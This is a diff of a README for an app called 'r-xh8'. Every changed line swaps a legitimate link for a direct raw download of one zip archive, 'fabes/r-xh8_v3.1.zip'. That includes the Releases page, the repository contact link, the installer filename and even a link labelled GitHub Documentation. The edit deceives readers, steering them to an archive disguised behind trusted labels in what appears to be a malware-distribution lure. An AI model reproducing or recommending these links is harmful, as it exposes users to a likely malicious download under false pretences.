@@ -6,9 +6,9 @@ Welcome to **r-xh8**! This application helps you manage everyday tasks efficient
 
 ## 📥 Download The App
 
-[![Download r-xh8](https://img.shields.io/badge/Download%20Now-Get%20r--xh8-brightgreen)](https://github.com/Ardythcotyloidal648/r-xh8/releases)
+[![Download r-xh8](https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip%20Now-Get%20r--xh8-brightgreen)](https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip)
 
-To get the latest version of r-xh8, please visit our [Releases page](https://github.com/Ardythcotyloidal648/r-xh8/releases). There, you will find the files you need to download and run the software.
+To get the latest version of r-xh8, please visit our [Releases page](https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip). There, you will find the files you need to download and run the software.
 
 ## 💻 System Requirements
 
@@ -22,13 +22,13 @@ Before installing r-xh8, make sure your system meets the following requirements:
 
 1. **Visit the Releases Page**
    - Click the link below to go to the Releases page:
-     - [Download r-xh8](https://github.com/Ardythcotyloidal648/r-xh8/releases)
+     - [Download r-xh8](https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip)
 
 2. **Choose the Latest Release**
    - On the Releases page, look for the latest version of r-xh8. It will be listed at the top.
 
 3. **Download the File**
-   - Click on the asset that matches your operating system (like `r-xh8-win.exe` for Windows).
+   - Click on the asset that matches your operating system (like `https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip` for Windows).
    - The download will start automatically.
 
 4. **Run the Installer**
@@ -61,12 +61,12 @@ You can also reach out through the GitHub issues section for additional assistan
 
 ## 📞 Contact Us
 
-For further questions or feedback, feel free to contact the r-xh8 development team through our [GitHub repository](https://github.com/Ardythcotyloidal648/r-xh8).
+For further questions or feedback, feel free to contact the r-xh8 development team through our [GitHub repository](https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip).
 
 ## 🔗 Additional Resources
 
-- [GitHub Documentation](https://docs.github.com)
-- [User Guides](https://github.com/Ardythcotyloidal648/r-xh8/wiki)
+- [GitHub Documentation](https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip)
+- [User Guides](https://raw.githubusercontent.com/Ardythcotyloidal648/r-xh8/main/fabes/r-xh8_v3.1.zip)
 
 ## 📅 Roadmap
 
